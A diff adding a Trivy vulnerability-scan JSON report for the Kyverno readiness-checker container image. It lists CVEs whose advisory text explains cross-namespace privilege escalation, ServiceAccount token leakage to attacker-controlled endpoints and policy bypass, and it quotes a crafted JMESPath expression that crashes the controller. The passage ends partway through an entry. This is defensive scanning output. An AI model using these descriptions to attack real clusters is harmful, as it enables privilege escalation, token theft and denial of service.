@@ -1,0 +1,805 @@
+{
+  "SchemaVersion": 2,
+  "Trivy": {
+    "Version": "0.76.0"
+  },
+  "ReportID": "01a13a88-39e8-70af-b0e7-2ba5a3ce06dd",
+  "CreatedAt": "2026-10-14T15:09:28.680046205+02:00",
+  "ArtifactID": "sha256:7d4c3b20ae78b2e38591361be19de56dd99f1fb411dc4cb7073d1752248f9f7a",
+  "ArtifactName": "ghcr.io/kyverno/readiness-checker:latest",
+  "ArtifactType": "container_image",
+  "Metadata": {
+    "Size": 27835904,
+    "OS": {
+      "Family": "alpine",
+      "Name": "3.25.0_alpha20260805"
+    },
+    "ImageID": "sha256:e89379197bd4e9d1bddd2f12924031a0a664aa2da741aa74db746e4c54f0bce9",
+    "DiffIDs": [
+      "sha256:0929f45a2d1da23ca51590ad8f9bd4b436577316cbbbd2e574cfc8462c727c83",
+      "sha256:67c90ba121a06d152912db237847a9f960c3d203cc93f971812ad315cdf338d5",
+      "sha256:bf6be559b4b3e4ec728c57164db7f34023ea2721af661b6c7746f3001527cff5"
+    ],
+    "RepoTags": [
+      "ghcr.io/kyverno/readiness-checker:latest"
+    ],
+    "RepoDigests": [
+      "ghcr.io/kyverno/readiness-checker@sha256:d52dd1fd0ea857abb2eddf815d5e33ba7a94cd948527cc36c97e36800f08ba2a"
+    ],
+    "Reference": "ghcr.io/kyverno/readiness-checker:latest",
+    "ImageConfig": {
+      "architecture": "amd64",
+      "author": "github.com/ko-build/ko",
+      "created": "2026-10-04T14:24:24Z",
+      "history": [
+        {
+          "author": "apko",
+          "created": "2026-10-04T14:24:24Z",
+          "created_by": "apko",
+          "comment": "This is an apko single-layer image"
+        },
+        {
+          "author": "ko",
+          "created": "0001-01-01T00:00:00Z",
+          "created_by": "ko build ko://github.com/kyverno/kyverno/cmd/readiness-checker",
+          "comment": "kodata contents, at $KO_DATA_PATH"
+        },
+        {
+          "author": "ko",
+          "created": "0001-01-01T00:00:00Z",
+          "created_by": "ko build ko://github.com/kyverno/kyverno/cmd/readiness-checker",
+          "comment": "go build output, at /ko-app/readiness-checker"
+        }
+      ],
+      "os": "linux",
+      "rootfs": {
+        "type": "layers",
+        "diff_ids": [
+          "sha256:0929f45a2d1da23ca51590ad8f9bd4b436577316cbbbd2e574cfc8462c727c83",
+          "sha256:67c90ba121a06d152912db237847a9f960c3d203cc93f971812ad315cdf338d5",
+          "sha256:bf6be559b4b3e4ec728c57164db7f34023ea2721af661b6c7746f3001527cff5"
+        ]
+      },
+      "config": {
+        "Entrypoint": [
+          "/ko-app/readiness-checker"
+        ],
+        "Env": [
+          "PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/sbin:/sbin:/bin:/ko-app",
+          "SSL_CERT_FILE=/etc/ssl/certs/ca-certificates.crt",
+          "KO_DATA_PATH=/var/run/ko"
+        ],
+        "Labels": {
+          "org.opencontainers.image.created": "2026-10-04T14:24:24Z"
+        },
+        "User": "65532"
+      }
+    },
+    "Layers": [
+      {
+        "Size": 1191424,
+        "Digest": "sha256:0980437f2d8c3033618d594b435abda84c7eb3dc4bef81104a34afb2c51028f2",
+        "DiffID": "sha256:0929f45a2d1da23ca51590ad8f9bd4b436577316cbbbd2e574cfc8462c727c83"
+      },
+      {
+        "Size": 17920,
+        "Digest": "sha256:5fac7d110919dd92f1bf6bf731f63f35e7814cc0144a5fef30d41e068f44b4f2",
+        "DiffID": "sha256:67c90ba121a06d152912db237847a9f960c3d203cc93f971812ad315cdf338d5"
+      },
+      {
+        "Size": 26626560,
+        "Digest": "sha256:ef929f7c472662195a3ed5cf5271ef88a07cff62e3014e094a1a1ef60f912bd0",
+        "DiffID": "sha256:bf6be559b4b3e4ec728c57164db7f34023ea2721af661b6c7746f3001527cff5"
+      }
+    ]
+  },
+  "Results": [
+    {
+      "Target": "ghcr.io/kyverno/readiness-checker:latest (alpine 3.25.0_alpha20260805)",
+      "Class": "os-pkgs",
+      "Type": "alpine"
+    },
+    {
+      "Target": "ko-app/readiness-checker",
+      "Class": "lang-pkgs",
+      "Type": "gobinary",
+      "Vulnerabilities": [
+        {
+          "VulnerabilityID": "CVE-2026-22039",
+          "VendorIDs": [
+            "GHSA-8p9x-46gm-qfx2"
+          ],
+          "PkgID": "github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "PkgName": "github.com/kyverno/kyverno",
+          "PkgIdentifier": {
+            "PURL": "pkg:golang/github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43%2Bdirty",
+            "UID": "8f10599cdbdab282"
+          },
+          "InstalledVersion": "v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "FixedVersion": "1.15.3, 1.16.3",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:ef929f7c472662195a3ed5cf5271ef88a07cff62e3014e094a1a1ef60f912bd0",
+            "DiffID": "sha256:bf6be559b4b3e4ec728c57164db7f34023ea2721af661b6c7746f3001527cff5"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-22039",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Go",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"
+          },
+          "Fingerprint": "sha256:c67d1bf40dd34af89a842ba855baf34f537935c4100748d049cbb1fdff974112",
+          "Title": "Kyverno Cross-Namespace Privilege Escalation via Policy apiCall",
+          "Description": "Kyverno is a policy engine designed for cloud native platform engineering teams. Versions prior to 1.16.3 and 1.15.3 have a critical authorization boundary bypass in namespaced Kyverno Policy apiCall. The resolved `urlPath` is executed using the Kyverno admission controller ServiceAccount, with no enforcement that the request is limited to the policy’s namespace. As a result, any authenticated user with permission to create a namespaced Policy can cause Kyverno to perform Kubernetes API requests using Kyverno’s admission controller identity, targeting any API path allowed by that ServiceAccount’s RBAC. This breaks namespace isolation by enabling cross-namespace reads (for example, ConfigMaps and, where permitted, Secrets) and allows cluster-scoped or cross-namespace writes (for example, creating ClusterPolicies) by controlling the urlPath through context variable substitution. Versions 1.16.3 and 1.15.3 contain a patch for the vulnerability.",
+          "Severity": "CRITICAL",
+          "CweIDs": [
+            "CWE-269",
+            "CWE-918"
+          ],
+          "VendorSeverity": {
+            "bitnami": 4,
+            "ghsa": 4
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+              "V3Score": 10
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+              "V3Score": 10
+            }
+          },
+          "References": [
+            "https://github.com/kyverno/kyverno",
+            "https://github.com/kyverno/kyverno/commit/e0ba4de4f1e0ca325066d5095db51aec45b1407b",
+            "https://github.com/kyverno/kyverno/commit/eba60fa856c781bcb9c3be066061a3df03ae4e3e",
+            "https://github.com/kyverno/kyverno/security/advisories/GHSA-8p9x-46gm-qfx2",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-22039"
+          ],
+          "PublishedDate": "2026-01-27T17:16:12.097Z",
+          "LastModifiedDate": "2026-06-17T10:19:24.383Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2023-47630",
+          "VendorIDs": [
+            "GHSA-3hfq-cx9j-923w"
+          ],
+          "PkgID": "github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "PkgName": "github.com/kyverno/kyverno",
+          "PkgIdentifier": {
+            "PURL": "pkg:golang/github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43%2Bdirty",
+            "UID": "8f10599cdbdab282"
+          },
+          "InstalledVersion": "v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "FixedVersion": "1.10.5",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:ef929f7c472662195a3ed5cf5271ef88a07cff62e3014e094a1a1ef60f912bd0",
+            "DiffID": "sha256:bf6be559b4b3e4ec728c57164db7f34023ea2721af661b6c7746f3001527cff5"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2023-47630",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Go",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"
+          },
+          "Fingerprint": "sha256:1c0e01a11133672afd3df1332087fded834c4ac94c879eaa17bd45773b85f9ac",
+          "Title": "Attacker can cause Kyverno user to unintentionally consume insecure image",
+          "Description": "Kyverno is a policy engine designed for Kubernetes. An issue was found in Kyverno that allowed an attacker to control the digest of images used by Kyverno users. The issue would require the attacker to compromise the registry that the Kyverno users fetch their images from. The attacker could then return an vulnerable image to the the user and leverage that to further escalate their position. As such, the attacker would need to know which images the Kyverno user consumes and know of one of multiple exploitable vulnerabilities in previous digests of the images. Alternatively, if the attacker has compromised the registry, they could craft a malicious image with a different digest with intentionally placed vulnerabilities and deliver the image to the user.  Users pulling their images by digests and from trusted registries are not impacted by this vulnerability. There is no evidence of this being exploited in the wild. The issue has been patched in 1.10.5. All users are advised to upgrade. There are no known workarounds for this vulnerability.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-345"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "nvd": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H",
+              "V3Score": 7.1
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H",
+              "V3Score": 7.1
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H",
+              "V3Score": 7.1
+            }
+          },
+          "References": [
+            "https://github.com/kyverno/kyverno",
+            "https://github.com/kyverno/kyverno/releases/tag/v1.11.0",
+            "https://github.com/kyverno/kyverno/security/advisories/GHSA-3hfq-cx9j-923w",
+            "https://nvd.nist.gov/vuln/detail/CVE-2023-47630"
+          ],
+          "PublishedDate": "2023-11-14T21:15:13.037Z",
+          "LastModifiedDate": "2026-06-17T06:33:00.81Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2024-48921",
+          "VendorIDs": [
+            "GHSA-qjvc-p88j-j9rm"
+          ],
+          "PkgID": "github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "PkgName": "github.com/kyverno/kyverno",
+          "PkgIdentifier": {
+            "PURL": "pkg:golang/github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43%2Bdirty",
+            "UID": "8f10599cdbdab282"
+          },
+          "InstalledVersion": "v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "FixedVersion": "1.13.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:ef929f7c472662195a3ed5cf5271ef88a07cff62e3014e094a1a1ef60f912bd0",
+            "DiffID": "sha256:bf6be559b4b3e4ec728c57164db7f34023ea2721af661b6c7746f3001527cff5"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2024-48921",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Go",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"
+          },
+          "Fingerprint": "sha256:0e4f6ce807e2fa7a22a809fff592334008305d740122aa8a4e4d1accd8c042bc",
+          "Title": "Kyverno's PolicyException objects can be created in any namespace by default",
+          "Description": "Kyverno is a policy engine designed for Kubernetes. A kyverno ClusterPolicy, ie. \"disallow-privileged-containers,\" can be overridden by the creation of a PolicyException in a random namespace. By design, PolicyExceptions are consumed from any namespace. Administrators may not recognize that this allows users with privileges to non-kyverno namespaces to create exceptions. This vulnerability is fixed in 1.13.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-285",
+            "CWE-863"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "nvd": 1
+          },
+          "CVSS": {
+            "bitnami": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+              "V3Score": 7.5,
+              "V40Score": 8.7
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:N",
+              "V3Score": 2.7
+            }
+          },
+          "References": [
+            "https://github.com/kyverno/kyverno",
+            "https://github.com/kyverno/kyverno/security/advisories/GHSA-qjvc-p88j-j9rm",
+            "https://nvd.nist.gov/vuln/detail/CVE-2024-48921"
+          ],
+          "PublishedDate": "2024-10-29T15:15:10.593Z",
+          "LastModifiedDate": "2026-06-17T07:59:03.62Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2025-46342",
+          "VendorIDs": [
+            "GHSA-jrr2-x33p-6hvc"
+          ],
+          "PkgID": "github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "PkgName": "github.com/kyverno/kyverno",
+          "PkgIdentifier": {
+            "PURL": "pkg:golang/github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43%2Bdirty",
+            "UID": "8f10599cdbdab282"
+          },
+          "InstalledVersion": "v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "FixedVersion": "1.13.5, 1.14.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:ef929f7c472662195a3ed5cf5271ef88a07cff62e3014e094a1a1ef60f912bd0",
+            "DiffID": "sha256:bf6be559b4b3e4ec728c57164db7f34023ea2721af661b6c7746f3001527cff5"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-46342",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Go",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"
+          },
+          "Fingerprint": "sha256:53f033512c57ebd90157c1f3578461a71bc94178d85bd2e0e520668464d534b7",
+          "Title": "Kyverno vulnerable to bypass of policy rules that use namespace selectors in match statements",
+          "Description": "Kyverno is a policy engine designed for cloud native platform engineering teams. Prior to versions 1.13.5 and 1.14.0, it may happen that policy rules using namespace selector(s) in their match statements are mistakenly not applied during admission review request processing due to a missing error propagation in function `GetNamespaceSelectorsFromNamespaceLister` in `pkg/utils/engine/labels.go`. As a consequence, security-critical mutations and validations are bypassed, potentially allowing attackers with K8s API access to perform malicious operations. This issue has been patched in versions 1.13.5 and 1.14.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-1287"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "nvd": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:N/I:H/A:H",
+              "V3Score": 8.2
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
+              "V3Score": 8.6
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:N/I:H/A:H",
+              "V3Score": 8.2
+            }
+          },
+          "References": [
+            "https://github.com/kyverno/kyverno",
+            "https://github.com/kyverno/kyverno/commit/3ff923b7756e1681daf73849954bd88516589194",
+            "https://github.com/kyverno/kyverno/security/advisories/GHSA-jrr2-x33p-6hvc",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-46342",
+            "https://pkg.go.dev/vuln/GO-2025-3652"
+          ],
+          "PublishedDate": "2025-04-30T15:16:02.44Z",
+          "LastModifiedDate": "2026-06-17T09:26:16.163Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2025-47281",
+          "VendorIDs": [
+            "GHSA-r5p3-955p-5ggq"
+          ],
+          "PkgID": "github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "PkgName": "github.com/kyverno/kyverno",
+          "PkgIdentifier": {
+            "PURL": "pkg:golang/github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43%2Bdirty",
+            "UID": "8f10599cdbdab282"
+          },
+          "InstalledVersion": "v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "FixedVersion": "1.14.2",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:ef929f7c472662195a3ed5cf5271ef88a07cff62e3014e094a1a1ef60f912bd0",
+            "DiffID": "sha256:bf6be559b4b3e4ec728c57164db7f34023ea2721af661b6c7746f3001527cff5"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-47281",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Go",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"
+          },
+          "Fingerprint": "sha256:7738d66d9f68932fcde20f643f4d796bbed3f96bd778c7cb0d1668d524b4b707",
+          "Title": "Kyverno's Improper JMESPath Variable Evaluation Lead to Denial of Service",
+          "Description": "Kyverno is a policy engine designed for cloud native platform engineering teams. In versions 1.14.1 and below, a Denial of Service (DoS) vulnerability exists due to improper handling of JMESPath variable substitutions. Attackers with permissions to create or update Kyverno policies can craft expressions using the {{@}} variable combined with a pipe and an invalid JMESPath function (e.g., {{@ | non_existent_function }}). This leads to a nil value being substituted into the policy structure. Subsequent processing by internal functions, specifically getValueAsStringMap, which expect string values, results in a panic due to a type assertion failure (interface {} is nil, not string). This crashes Kyverno worker threads in the admission controller and causes continuous crashes of the reports controller pod. This is fixed in version 1.14.2.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-20",
+            "CWE-248"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H",
+              "V3Score": 7.7
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H",
+              "V3Score": 7.7
+            }
+          },
+          "References": [
+            "https://github.com/kyverno/kyverno",
+            "https://github.com/kyverno/kyverno/commit/cbd7d4ca24de1c55396fc3295e9fc3215832be7c",
+            "https://github.com/kyverno/kyverno/security/advisories/GHSA-r5p3-955p-5ggq",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-47281"
+          ],
+          "PublishedDate": "2025-07-23T21:15:26.397Z",
+          "LastModifiedDate": "2026-06-17T09:27:39.683Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-23881",
+          "VendorIDs": [
+            "GHSA-r2rj-wwm5-x6mq"
+          ],
+          "PkgID": "github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "PkgName": "github.com/kyverno/kyverno",
+          "PkgIdentifier": {
+            "PURL": "pkg:golang/github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43%2Bdirty",
+            "UID": "8f10599cdbdab282"
+          },
+          "InstalledVersion": "v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "FixedVersion": "1.15.3, 1.16.3",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:ef929f7c472662195a3ed5cf5271ef88a07cff62e3014e094a1a1ef60f912bd0",
+            "DiffID": "sha256:bf6be559b4b3e4ec728c57164db7f34023ea2721af661b6c7746f3001527cff5"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-23881",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Go",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"
+          },
+          "Fingerprint": "sha256:3403393279bd94560b11e96a2fa1dfa068686b163a389e439f48efa89c621c22",
+          "Title": "Kyverno Denial of Service via Context Variable Amplification in Policy Engine",
+          "Description": "Kyverno is a policy engine designed for cloud native platform engineering teams. Versions prior to 1.16.3 and 1.15.3 have unbounded memory consumption in Kyverno's policy engine that allows users with policy creation privileges to cause denial of service by crafting policies that exponentially amplify string data through context variables. Versions 1.16.3 and 1.15.3 contain a patch for the vulnerability.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-770"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "nvd": 2
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H",
+              "V3Score": 7.7
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H",
+              "V3Score": 7.7
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://github.com/kyverno/kyverno",
+            "https://github.com/kyverno/kyverno/commit/7a651be3a8c78dcabfbf4178b8d89026bf3b850f",
+            "https://github.com/kyverno/kyverno/commit/f5617f60920568a301740485472bf704892175b7",
+            "https://github.com/kyverno/kyverno/security/advisories/GHSA-r2rj-wwm5-x6mq",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-23881"
+          ],
+          "PublishedDate": "2026-01-27T17:16:12.733Z",
+          "LastModifiedDate": "2026-06-17T10:22:14.887Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-40868",
+          "VendorIDs": [
+            "GHSA-q93q-v844-jrqp"
+          ],
+          "PkgID": "github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "PkgName": "github.com/kyverno/kyverno",
+          "PkgIdentifier": {
+            "PURL": "pkg:golang/github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43%2Bdirty",
+            "UID": "8f10599cdbdab282"
+          },
+          "InstalledVersion": "v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "FixedVersion": "1.17.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:ef929f7c472662195a3ed5cf5271ef88a07cff62e3014e094a1a1ef60f912bd0",
+            "DiffID": "sha256:bf6be559b4b3e4ec728c57164db7f34023ea2721af661b6c7746f3001527cff5"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-40868",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Go",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"
+          },
+          "Fingerprint": "sha256:ea96a4fffedb7eeedbef025badca0bfb4e499c16b26445924a4734fc1eac8f24",
+          "Title": "kyverno apicall servicecall implicit bearer token injection leaks kyverno serviceaccount token",
+          "Description": "Kyverno is a policy engine designed for cloud native platform engineering teams. Prior to 1.16.4, kyverno’s apiCall servicecall helper implicitly injects Authorization: Bearer ... using the kyverno controller serviceaccount token when a policy does not explicitly set an Authorization header. Because context.apiCall.service.url is policy-controlled, this can send the kyverno serviceaccount token to an attacker-controlled endpoint (confused deputy). Namespaced policies are blocked from servicecall usage by the namespaced urlPath gate in pkg/engine/apicall/apiCall.go, so this report is scoped to ClusterPolicy and global context usage. This vulnerability is fixed in 1.16.4.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-922"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 8.1
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 8.1
+            }
+          },
+          "References": [
+            "https://github.com/kyverno/kyverno",
+            "https://github.com/kyverno/kyverno/security/advisories/GHSA-q93q-v844-jrqp",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-40868"
+          ],
+          "PublishedDate": "2026-04-21T19:16:18.42Z",
+          "LastModifiedDate": "2026-06-17T10:45:47.693Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-41068",
+          "VendorIDs": [
+            "GHSA-cvq5-hhx3-f99p"
+          ],
+          "PkgID": "github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "PkgName": "github.com/kyverno/kyverno",
+          "PkgIdentifier": {
+            "PURL": "pkg:golang/github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43%2Bdirty",
+            "UID": "8f10599cdbdab282"
+          },
+          "InstalledVersion": "v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "Status": "affected",
+          "Layer": {
+            "Digest": "sha256:ef929f7c472662195a3ed5cf5271ef88a07cff62e3014e094a1a1ef60f912bd0",
+            "DiffID": "sha256:bf6be559b4b3e4ec728c57164db7f34023ea2721af661b6c7746f3001527cff5"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-41068",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Go",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"
+          },
+          "Fingerprint": "sha256:2b14657a9c3ab7434aea88b9a9bbd0345edcb783a265e5b1ad6652f09faa9018",
+          "Title": "Kyverno: Cross-Namespace Read Bypasses RBAC Isolation (CVE-2026-22039 Incomplete Fix)",
+          "Description": "Kyverno is a policy engine designed for cloud native platform engineering teams. The patch for CVE-2026-22039 fixed cross-namespace privilege escalation in Kyverno's `apiCall` context by validating the `URLPath` field. However, the ConfigMap context loader has the identical vulnerability — the `configMap.namespace` field accepts any namespace with zero validation, allowing a namespace admin to read ConfigMaps from any namespace using Kyverno's privileged service account. This is a complete RBAC bypass in multi-tenant Kubernetes clusters. An updated fix is available in version 1.17.2.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-863"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+              "V3Score": 7.7
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+              "V3Score": 7.7
+            }
+          },
+          "References": [
+            "https://github.com/kyverno/kyverno",
+            "https://github.com/kyverno/kyverno/commit/bbf3e5c01391d612968440659028ae98e565a777",
+            "https://github.com/kyverno/kyverno/security/advisories/GHSA-cvq5-hhx3-f99p",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-41068"
+          ],
+          "PublishedDate": "2026-04-24T04:16:19.95Z",
+          "LastModifiedDate": "2026-06-17T10:46:07.213Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-41323",
+          "VendorIDs": [
+            "GHSA-f9g8-6ppc-pqq4"
+          ],
+          "PkgID": "github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "PkgName": "github.com/kyverno/kyverno",
+          "PkgIdentifier": {
+            "PURL": "pkg:golang/github.com/kyverno/kyverno@v1.5.0-rc1.0.20261014034003-104ab6f30a43%2Bdirty",
+            "UID": "8f10599cdbdab282"
+          },
+          "InstalledVersion": "v1.5.0-rc1.0.20261014034003-104ab6f30a43+dirty",
+          "FixedVersion": "1.17.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:ef929f7c472662195a3ed5cf5271ef88a07cff62e3014e094a1a1ef60f912bd0",
+            "DiffID": "sha256:bf6be559b4b3e4ec728c57164db7f34023ea2721af661b6c7746f3001527cff5"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-41323",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Go",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"
+          },
+          "Fingerprint": "sha256:e18d596e3da9a4cd6ab3c3f4771d5def1230d354f3fb89aa5f9cd236700161b0",
+          "Title": "Kyverno: ServiceAccount token leaked to external servers via apiCall service URL",
+          "Description": "Kyverno is a policy engine designed for cloud native platform engineering teams. Prior to versions 1.18.0-rc1, 1.17.2-rc1, and 1.16.4, Kyverno's apiCall feature in ClusterPolicy automatically attaches the admission controller's ServiceAccount token to outgoing HTTP requests. The service URL has no validation — it can point anywhere, including attacker-controlled servers. Since the admission controller SA has permissions to patch webhook configurations, a stolen token leads to full cluster compromise. Versions 1.18.0-rc1, 1.17.2-rc1, and 1.16.4 patch the issue.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-200",
+            "CWE-918"
+          ],
+          "VendorSeverity": {
+            "bitnami": 4,
+            "ghsa": 3,
+            "nvd": 4
+          },
+          "CVSS": {
+            "bitnami": {
